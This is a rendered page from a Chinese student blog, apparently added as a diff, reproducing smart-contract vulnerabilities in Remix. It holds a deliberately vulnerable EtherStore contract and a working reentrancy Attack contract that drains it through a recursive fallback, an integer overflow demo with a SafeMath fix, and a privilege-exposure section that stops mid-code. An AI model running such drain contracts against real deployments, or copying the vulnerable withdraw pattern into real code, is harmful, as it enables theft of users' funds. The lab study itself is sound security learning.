@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Remix使用以及部分合约漏洞复现 | 魔法☆梅莉</title>
+    <meta name="description" content="">
+    <meta name="generator" content="VuePress 1.9.7">
+    <link rel="icon" href="/img/meili.jpg">
+    <meta name="description" content="L15hee7的个人blog">
+    <link rel="preload" href="/assets/css/0.styles.b33b8572.css" as="style"><link rel="preload" href="/assets/js/app.b6aa09f0.js" as="script"><link rel="preload" href="/assets/js/2.be74dbea.js" as="script"><link rel="preload" href="/assets/js/3.00b422a5.js" as="script"><link rel="prefetch" href="/assets/js/10.3ff3ecee.js"><link rel="prefetch" href="/assets/js/11.a221821f.js"><link rel="prefetch" href="/assets/js/12.06998f09.js"><link rel="prefetch" href="/assets/js/13.ffd3dadc.js"><link rel="prefetch" href="/assets/js/14.fc64ac2e.js"><link rel="prefetch" href="/assets/js/15.dd285966.js"><link rel="prefetch" href="/assets/js/16.7ed8b83a.js"><link rel="prefetch" href="/assets/js/17.8fb916a8.js"><link rel="prefetch" href="/assets/js/18.eeb0d10b.js"><link rel="prefetch" href="/assets/js/19.96f8f9b6.js"><link rel="prefetch" href="/assets/js/20.c700f3ed.js"><link rel="prefetch" href="/assets/js/21.2e5b68bf.js"><link rel="prefetch" href="/assets/js/4.92e35ee9.js"><link rel="prefetch" href="/assets/js/5.d4aa99cd.js"><link rel="prefetch" href="/assets/js/6.12fc1b54.js"><link rel="prefetch" href="/assets/js/7.ca9bfdc4.js"><link rel="prefetch" href="/assets/js/8.07b499f2.js"><link rel="prefetch" href="/assets/js/9.ee404436.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.b33b8572.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="nav-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-6 ant-col-xl-5 ant-col-xxl-4"><a href="/" class="router-link-active home-link"><img src="/img/meili.jpg" alt="魔法☆梅莉" class="logo"> <span class="site-name">魔法☆梅莉</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="nav-space-between ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-18 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><ul role="menu" id="nav" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-light"><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/" class="router-link-active">
+          首页
+        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>
+          论文学习
+        </span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-submenu-selected"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>
+          学习相关
+        </span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>
+          日常
+        </span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>
+          pc使用相关
+        </span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>
+          动态
+        </span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <ul class="extra-group"><!----> <!----></ul></nav></div></div> <!----></header> <aside class="sidebar"><!---->  <ul class="sidebar-links"><li><a href="/study/" aria-current="page" title="更新日期" class="sidebar-link">更新日期</a></li><li><a href="/study/git密钥问题.html" title="解决git@github.com: Permission denied (publickey)问题" class="sidebar-link">解决git@github.com: Permission denied (publickey)问题</a></li><li><a href="/study/搭建fabric环境.html" title="搭建Fabric环境" class="sidebar-link">搭建Fabric环境</a></li><li><a href="/study/yaml学习.html" title="yaml文件编写" class="sidebar-link">yaml文件编写</a></li><li><a href="/study/fabric学习.html" title="fabric学习" class="sidebar-link">fabric学习</a></li><li><a href="/study/remix使用.html" title="Remix使用以及部分合约漏洞复现" class="active sidebar-link">Remix使用以及部分合约漏洞复现</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/study/remix使用.html#_0x00-开始" title="0x00 开始" class="sidebar-link">0x00 开始</a></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#_0x01-重注入攻击复现" title="0x01 重注入攻击复现" class="sidebar-link">0x01 重注入攻击复现</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/study/remix使用.html#漏洞分析" title="漏洞分析" class="sidebar-link">漏洞分析</a></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#漏洞复现" title="漏洞复现" class="sidebar-link">漏洞复现</a></li></ul></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#_0x02-整数溢出复现" title="0x02 整数溢出复现" class="sidebar-link">0x02 整数溢出复现</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/study/remix使用.html#漏洞分析-2" title="漏洞分析" class="sidebar-link">漏洞分析</a></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#漏洞复现-2" title="漏洞复现" class="sidebar-link">漏洞复现</a></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#修复方法" title="修复方法" class="sidebar-link">修复方法</a></li></ul></li><li class="sidebar-sub-header"><a href="/study/remix使用.html#_0x03-特权功能暴露功能" title="0x03 特权功能暴露功能" class="sidebar-link">0x03 特权功能暴露功能</a></li></ul></li><li><a href="/study/机器学习.html" title="机器学习相关" class="sidebar-link">机器学习相关</a></li><li><a href="/study/LaTex学习.html" title="LaTex学习和使用" class="sidebar-link">LaTex学习和使用</a></li><li><a href="/study/Jupyter Notebook的安装和使用.html" title="Jupyter Notebook的安装和使用" class="sidebar-link">Jupyter Notebook的安装和使用</a></li></ul> </aside> <main class="page has-page-anchor"> <div class="theme-antdocs-content content__default"><h1 id="remix使用以及部分合约漏洞复现"><a href="#remix使用以及部分合约漏洞复现" class="header-anchor">#</a> Remix使用以及部分合约漏洞复现</h1> <h2 id="_0x00-开始"><a href="#_0x00-开始" class="header-anchor">#</a> 0x00 开始</h2> <p>因为最近在做毕业设计相关的内容，需要学习智能合约中可能会出现的漏洞。因此在查询了多方资料后使用Remix进行测试和实验，但是整个实验的过程还是有点一知半解，要是后面后继续学习的话会更加深入地去了解一下。</p> <h2 id="_0x01-重注入攻击复现"><a href="#_0x01-重注入攻击复现" class="header-anchor">#</a> 0x01 重注入攻击复现</h2> <h3 id="漏洞分析"><a href="#漏洞分析" class="header-anchor">#</a> 漏洞分析</h3> <p>以太坊智能合约的特点之一是能够调用其他外部合约的代码，然而这些外部合约可能被攻击者劫持，迫使合约通过回退函数进一步执行代码，包括回调本身。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。</p> <h3 id="漏洞复现"><a href="#漏洞复现" class="header-anchor">#</a> 漏洞复现</h3> <p>我们先来看以下代码：</p> <div class="language-solidity line-numbers-mode"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.3</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">EtherStore</span> <span class="token punctuation">{</span><span class="token comment">//漏洞合约</span>
+
+    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> balances<span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span> <span class="token comment">//将Eth存入合约</span>
+       balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span><span class="token comment">//将存入的资金取出</span>
+        <span class="token builtin">uint</span> balance <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>balance <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查</span>
+
+        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> balance<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交互--发起转账此处为漏洞处</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//生效--状态变量修改</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//获取合约余额</span>
+        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span><span class="token comment">//攻击合约</span>
+    EtherStore <span class="token keyword">public</span> etherstore<span class="token punctuation">;</span>
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span>  <span class="token keyword">payable</span> test<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
+        etherstore <span class="token operator">=</span> <span class="token function">EtherStore</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">_deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token comment">//向漏洞合约存入ETH</span>
+        etherstore<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">1</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span><span class="token comment">//开始攻击，取回合约中的ETH</span>
+        etherstore<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">getbalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//获取当前合约余额</span>
+        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token comment">//触发Fallback，递归调用取回函数</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>etherstore<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            etherstore<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>将代码部署在remix上后，首先给第一个账户给两个eth，运行漏洞合约</p> <p><img src="/assets/img/image-20230323154912170.095d1fd3.png" alt="image-20230323154912170"></p> <p>此时可以看见账户中是有2个eth的</p> <img src="/assets/img/image-20230323155038680.5033ec25.png" alt="image-20230323155038680" style="zoom:50%;"> <p>然后运行攻击函数，此处attack后跟的是第一个合约的地址</p> <p><img src="/assets/img/image-20230323162732252.deb7248c.png" alt="image-20230323162732252"></p> <p>然后能看到此处攻击账户也是有1eth的</p> <img src="/assets/img/image-20230323162951671.7e9afc79.png" alt="image-20230323162951671" style="zoom:50%;"> <p>然后先进行转账再进行攻击，此时能看见攻击成功后攻击账户获取到了原账户的钱</p> <img src="/assets/img/image-20230323163405753.94403638.png" alt="image-20230323163405753" style="zoom:50%;"> <h2 id="_0x02-整数溢出复现"><a href="#_0x02-整数溢出复现" class="header-anchor">#</a> 0x02 整数溢出复现</h2> <h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="header-anchor">#</a> 漏洞分析</h3> <p>在 solidity 中，当一个整型变量高于或者低于他所能承受的范围时，就会发生溢出，导致一些不可预期的情况出现。例如，当用户转账金额超过系统预设的最大值时，只要用户金额大于零，用户就可以直接将巨额的代币转走</p> <h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="header-anchor">#</a> 漏洞复现</h3> <div class="language-solidity line-numbers-mode"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&gt;=</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span>
+
+<span class="token comment">//整数溢出的上溢出和下溢出</span>
+<span class="token keyword">contract</span> <span class="token class-name">OverFlowUnderFlow</span> <span class="token punctuation">{</span>
+    <span class="token builtin">uint8</span> <span class="token keyword">public</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token builtin">uint8</span> <span class="token keyword">public</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// a will end up at 2**8-1</span>
+    <span class="token keyword">function</span> <span class="token function">underflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+        a <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment">// b will end up at 0</span>
+    <span class="token keyword">function</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+        b <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>运行漏洞脚本，此时可以看见a 的值为0，b的值为255</p> <img src="/assets/img/image-20230324152229427.c862cdf9.png" alt="image-20230324152229427" style="zoom:50%;"> <p>然后执行溢出的上溢和下溢，结束后发现a明明执行的是-1，b执行的是+1但是a却变成了255，b变成了0。可以明显看到出现了上溢和下溢</p> <img src="/assets/img/image-20230324153750661.ffd7da64.png" alt="image-20230324153750661" style="zoom:50%;"> <h3 id="修复方法"><a href="#修复方法" class="header-anchor">#</a> 修复方法</h3> <p>官方给出了专门的数学方法来保障在加法减法以及乘法的安全性，以下为修正过的代码</p> <div class="language-solidity line-numbers-mode"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&gt;=</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token string">&quot;./SafeMath.sol&quot;</span><span class="token punctuation">;</span>
+
+<span class="token comment">// contract to test uint8 integer underflows and overflows</span>
+<span class="token comment">// fixed by using SafeMath</span>
+<span class="token keyword">contract</span> <span class="token class-name">OverFlowUnderFlowFixed</span> <span class="token punctuation">{</span>
+    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint</span><span class="token punctuation">;</span>
+    <span class="token builtin">uint</span> <span class="token keyword">public</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token builtin">uint</span> <span class="token keyword">public</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// will throw</span>
+    <span class="token keyword">function</span> <span class="token function">underflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+        a <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment">// will throw</span>
+    <span class="token keyword">function</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+        b <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>此处为官方给出的计算方法</p> <div class="language-solidity line-numbers-mode"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">library</span> <span class="token class-name">SafeMath</span> <span class="token punctuation">{</span>
+  <span class="token keyword">function</span> <span class="token function">mul</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>
+    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">/</span> a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">function</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// assert(b &gt; 0); // Solidity automatically throws when dividing by 0</span>
+    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">/</span> b<span class="token punctuation">;</span>
+    <span class="token comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span>
+    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">function</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">assert</span><span class="token punctuation">(</span>b <span class="token operator">&lt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
+    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">&gt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> c<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h2 id="_0x03-特权功能暴露功能"><a href="#_0x03-特权功能暴露功能" class="header-anchor">#</a> 0x03 特权功能暴露功能</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>/**
+ *Submitted for verification at Etherscan.io on 2018-01-18
+*/
+
+pragma solidity ^0.4.17;
+
+contract Token {
+
+    function totalSupply() constant returns (uint256 supply) {}
+
+    function balanceOf(address _owner) constant returns (uint256 balance) {}
+
+    function transfer(address _to, uint256 _value) returns (bool success) {}
+
+    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
+
+    function approve(address _spender, uint256 _value) returns (bool success) {}
+
+    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
+
+    event Transfer(address indexed _from, address indexed _to, uint256 _value);
+
+    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
+
+}
+
+contract StandardToken is Token {
+
+    function transfer(address _to, uint256 _value) returns (bool success) {
+        
+        if (balances[msg.sender] &gt;= _value &amp;&amp; _value &gt; 0) {
+            balances[msg.sender] -= _value;
+            balances[_to] += _value;
+            Transfer(msg.sender, _to, _value);
+            return true;
+        } else { 
